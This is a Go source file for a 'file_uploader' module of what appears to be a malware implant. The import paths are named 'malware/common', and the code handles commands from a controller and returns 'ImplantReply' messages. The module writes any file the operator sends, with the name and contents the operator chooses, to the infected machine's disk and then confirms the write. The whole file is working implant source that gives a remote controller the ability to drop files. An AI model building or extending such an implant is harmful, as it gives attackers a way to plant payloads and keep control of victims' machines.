package file_uploader

import (
	"io/ioutil"
	"malware/common"
	"malware/common/messages"
	"malware/common/types"
)

type state struct {
	running bool
}

type settings struct {
	state *state // Tell our loop to stop
}

// Create creates an implementation of settings
func Create() types.Module {
	state := state{running: false}
	return settings{&state}
}

func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.ImplantReply)) {
	file := message.GetUploadfile()
	if file == nil {
		return
	}

	err := ioutil.WriteFile(file.Filename, file.Contents, 0644)

	if err != nil {
		common.Panicf(err, "Erroring loading file")
	}

	callback(&messages.ImplantReply{Module: settings.ID(), Args: []byte("Written")})
}

// Init the state of this module
func (settings settings) Init() {
	settings.state.running = true
}

func (settings settings) Shutdown() {
	settings.state.running = false
}

func (settings) ID() string { return "file_uploader" }
